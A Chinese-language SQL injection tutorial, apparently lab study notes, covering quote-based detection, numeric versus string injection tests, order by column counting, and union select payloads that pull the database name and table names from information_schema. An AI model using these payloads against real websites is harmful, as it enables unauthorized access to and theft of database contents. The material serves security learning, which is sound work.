SQL注入

就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通过构造恶意的输入，使数据库执行恶意命令，造成数据泄露或者修改内容等，以达到攻击的目的。主要是由于应用程序对用户的输入没有进行严格的过滤而造成的。

SQL简介

(structured query language)用于管理关系数据库系统（RDBMS）。

范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。

判断是否存在注入漏洞

最为经典的单引号判断法：
在参数后面加上单引号,比如: http://xxx/abc.php?id=1' 如果页面返回错误，则存在 Sql 注入。
原因是无论字符型还是数字型都会因为单引号个数不匹配而报错。

数字型：

假如在1后面加上单引号’ , $id的值就是1’

这时数据库执行的语句就是 select * from table where id=1’

单引号不匹配，语句正确，页面返回错误

（如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入）

字符型：

输入$id=1’

执行的SQL语句就是select * from table where id=‘1’’

单引号不匹配，语句错误，页面错误

即存在注入点

判断注入类型（也就是数据存储类型）

数字型判定

and

假设数据库的执行语句是：select*from table where id=$d;

当查询id=1的页面返回正常页面，此时执行的语句是：select *from table where id=1;

如果在1后面加上 and 1=1，$d的值就变成了1and1=1

数据库查询执行语句是select *from table where id=1and 1=1;

语句正确，真and真=真，逻辑正确，所以返回正常页面

同理

如果加的是and 1=2,

数据库查询执行语句是select *from table where id=1 and 1=2;

语句正确，逻辑错误，页面返回错误

or

or1=1和or1=2 都会返回正常

所以用and1=2来判断，返回错误为数字型，返回正确为字符型

字符型判定

假设数据库的执行语句是：select *from table where id=’$d’

当查询id=1的页面返回正常页面，此时执行的语句是：select *from table where id=’1’

假如在1后面加上 and 1=2 $id的值就是1 and 1=2

这时数据库执行的语句就是 select * from table where id=‘1 and 1=2’

页面返回正常

假如在1后面加上 or 1=1 $id的值就是1 or 1=1

这时数据库执行的语句就是 select * from table where id=‘1 or 1=1’

页面返回正常

所以如果字段是字符型的，那么我们用and或者or来测试时页面都会返回正常，就可以判断了

综上所述：

数字型注入判定：

  1. 输入单引号，不正常返回

  2. 输入and 1=1，正常返回

  3. 输入and1=2，不正常返回

字符型注入判定：

  1. 输入单引号，不正常返回
  2. 输入’ and ‘1’=‘1,正常返回
  3. 输入’and’1’=‘2，不正常返回

?id=1and 1=1和?di=1and 1=2返回是相同的

?id=1’and’1’=’2没有返回值

所以为字符型注入

（以某一列为标准进行排序，当选择的字段不存在时会报错。）

?id=1’ order by 1–+ ?id=1’ order by 2–+ ?id=1’ order by 3–+ ?id=1’ order by 4–+

union联合查询

因为数据可以输出到页面上，所以用union注入从数据库中查询参数id对应的内容，并输出到页面上。

union：用于合并两个或多个select语句的结果集

?id=1’union select 1,2,3–+

发现2，3传上去了，说明2，3的位置可以输入sql语句

?id=1’union select 1,2,database()

database():返回默认或当前数据库的名称

user()——返回用户名
database()——返回数据库名
version()——返回数据库版本信息

得到数据库的名是 security

获取数据表

?id=-1’union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+

?id=-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+

  3. information_schema是MySQL自带的一个信息数据库，保存着关于MySQL服务器所维护的所有其他数据库的信息。

  4. tables是information_schema数据库中的一个表，表中储存了数据库的库名以及各个数据库中的表名等信息，可以根据数据库的库名查询到该数据库包含的表有哪些
